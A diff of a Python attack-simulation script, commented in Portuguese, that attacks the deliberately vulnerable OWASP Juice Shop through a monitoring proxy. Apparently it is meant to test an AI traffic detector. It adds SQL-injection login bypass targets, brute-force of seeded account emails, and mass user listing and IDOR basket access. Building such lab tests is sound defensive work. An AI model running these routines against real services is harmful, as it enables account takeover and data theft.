@@ -241,10 +241,22 @@ def attack_privesc(target: str) -> AttackReport:
 # ALVO OWASP — JUICE SHOP (via proxy.py)
 # ============================================================================
 
-# Endpoints nativos do OWASP Juice Shop (estáveis, documentados pela OWASP).
-# O request passa pelo proxy (:9000), que loga em access_logs e aplica o 403.
-JUICESHOP_LOGIN = "/rest/user/login"
-JUICESHOP_SEARCH = "/rest/products/search"
+# Mapa de endpoints nativos do OWASP Juice Shop (estáveis, documentados pela
+# OWASP). Todo request passa pelo proxy (:9000), que loga em access_logs e
+# aplica o 403. Cada entrada: (metodo, path) — path com {id} e formatado na hora.
+JUICESHOP_ENDPOINTS = {
+    "login": ("POST", "/rest/user/login"),       # auth-bypass por SQLi (campo email)
+    "search": ("GET", "/rest/products/search"),  # SQLi via querystring q
+    "users": ("GET", "/api/Users"),              # listagem de usuarios (exfil/broken-access)
+    "products": ("GET", "/api/Products"),        # listagem de produtos (enumeracao)
+    "basket": ("GET", "/rest/basket/{id}"),      # IDOR — cesta de outro usuario (privesc)
+}
+
+JUICESHOP_LOGIN = JUICESHOP_ENDPOINTS["login"][1]
+JUICESHOP_SEARCH = JUICESHOP_ENDPOINTS["search"][1]
+
+# E-mails reais que o Juice Shop semeia. Alvos do brute-force no login nativo.
+JUICESHOP_USERS = ["admin@juice-sh.op", "jim@juice-sh.op", "bender@juice-sh.op"]
 
 # Payloads de login específicos do Juice Shop. Diferente do server.py (Postgres,
 # tabela própria), o Juice Shop usa SQLite com schema próprio, então os bypass
@@ -282,6 +294,22 @@ def attack_juiceshop(target: str) -> AttackReport:
     for payload in SQLI_SEARCH_PAYLOADS:
         resp = _get(target, JUICESHOP_SEARCH, {"q": payload})
         _tally(report, resp, lambda b: len(b.get("data", [])) > 0)
+
+    # 3) Brute-force no login nativo — e-mails reais semeados pelo Juice Shop.
+    #    Sucesso = token de autenticação devolvido.
+    for email in JUICESHOP_USERS:
+        for pwd in BRUTE_FORCE_PASSWORDS:
+            resp = _post(target, JUICESHOP_LOGIN, {"email": email, "password": pwd})
+            _tally(report, resp, lambda b: bool((b.get("authentication") or {}).get("token")))
+
+    # 4) Exfiltração / broken-access — tenta listar todos os usuários e cestas
+    #    de outro usuário (IDOR). Em produção exigiria admin; aqui o tráfego é
+    #    detectado e bloqueado pela IA. Sucesso = devolveu dados.
+    resp = _get(target, JUICESHOP_ENDPOINTS["users"][1], {})
+    _tally(report, resp, lambda b: len(b.get("data", [])) > 0)
+    for basket_id in (1, 2, 3):
+        resp = _get(target, JUICESHOP_ENDPOINTS["basket"][1].format(id=basket_id), {})
+        _tally(report, resp, lambda b: len(b.get("data", [])) > 0 if isinstance(b.get("data"), list) else bool(b.get("data")))
 
     report.duration_s = round(time.perf_counter() - started, 3)
     return report
